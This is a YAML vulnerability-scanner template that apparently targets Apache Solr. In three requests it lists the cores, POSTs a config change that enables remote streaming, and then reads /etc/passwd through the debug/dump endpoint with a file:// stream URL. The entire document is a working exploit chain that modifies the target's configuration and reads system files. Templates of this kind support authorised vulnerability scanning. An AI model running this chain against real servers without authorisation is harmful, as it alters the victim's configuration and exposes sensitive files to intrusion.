id: apache-solr-readfile

info:
  name: Apache Solr Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template exploits a configuration vulnerability in Apache Solr to enable remote streaming and subsequently perform an arbitrary file read.

http:
  - id: extract-core
    method: GET
    path:
      - '{{BaseURL}}/solr/admin/cores?wt=json'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "responseHeader"
        part: body
    extractors:
      - type: regex
        name: core
        internal: true
        regex:
          - '"name":"([^"]+)"'
        group: 1

  - id: enable-remote-streaming
    method: POST
    path:
      - '{{BaseURL}}/solr/{{core}}/config'
    headers:
      Content-Type: application/json
    body: |-
      {
        "set-property":{
          "requestDispatcher.requestParsers.enableRemoteStreaming":true
        }
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "This response format is experimental"
        part: body

  - id: file-read
    method: POST
    path:
      - '{{BaseURL}}/solr/{{core}}/debug/dump?param=ContentStreams'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: stream.url=file:///etc/passwd
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
